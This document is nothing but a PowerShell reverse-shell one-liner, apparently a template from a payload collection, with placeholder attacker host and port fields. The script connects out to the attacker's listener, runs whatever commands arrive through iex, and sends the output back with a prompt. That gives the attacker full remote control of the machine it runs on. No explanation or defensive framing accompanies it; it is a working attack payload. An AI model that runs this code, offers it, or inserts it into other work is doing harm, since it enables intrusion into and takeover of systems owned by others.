$a=New-Object System.Net.Sockets.TCPClient('<<LHOST>>',<<LPORT>>);$b=$a.GetStream();[byte[]]$d=0..65535|%{0};while(($e=$b.Read($d,0,$d.Length))-ne 0){;$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($d,0,$e);$k=(iex $i 2>&1 | Out-String);$m=$k + 'PS ' +(pwd).Path + '> ';$o=([text.encoding]::ASCII).GetBytes($m);$b.Write($o,0,$o.Length);$b.Flush()};$a.Close()